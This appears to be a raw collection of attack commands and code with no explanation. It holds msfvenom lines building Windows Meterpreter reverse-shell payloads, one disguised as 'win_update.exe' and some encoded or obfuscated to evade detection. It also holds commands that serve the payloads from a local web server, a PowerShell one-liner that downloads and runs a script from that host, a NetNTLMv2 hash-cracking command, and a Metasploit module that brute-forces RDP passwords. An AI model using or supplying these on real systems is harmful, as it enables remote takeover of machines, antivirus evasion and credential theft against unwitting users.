msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation


http://192.168.1.128:8080/update_pacth.exe

zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')


john --wordlist=wordlist_personalizada_advanced.txt --format=netntlmv2 hash_john.txt

##
# This module attempts to brute-force RDP logins
##

require 'msf/core'
require 'rex/proto/rdp'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::RDP
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'RDP Login Brute Force Scanner',
      'Description' => 'Brute-forces RDP logins',
      'Author'      => ['zerobyte-id', 'community'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(3389),
        OptString.new('USERNAME', [true, 'User to bruteforce']),
        OptPath.new('PASS_FILE', [true, 'File containing passwords to try'])
      ]
    )
  end

  def run_host(ip)
    password_list = File.readlines(datastore['PASS_FILE']).map(&:chomp)
    user = datastore['USERNAME']

    password_list.each do |password|
      begin
        print_status("Trying #{user}:#{password} on #{ip}")
        if rdp_login(ip, user, password)
          print_good("SUCCESS: #{user}:#{password} on #{ip}")
          report_cred(
            ip: ip,
            port: datastore['RPORT'],
            service_name: 'rdp',
            user: user,
            password: password
          )
          return
        end
      rescue ::Rex::ConnectionError
        print_error("Could not connect to #{ip}")
        return
      end
    end
  end
end





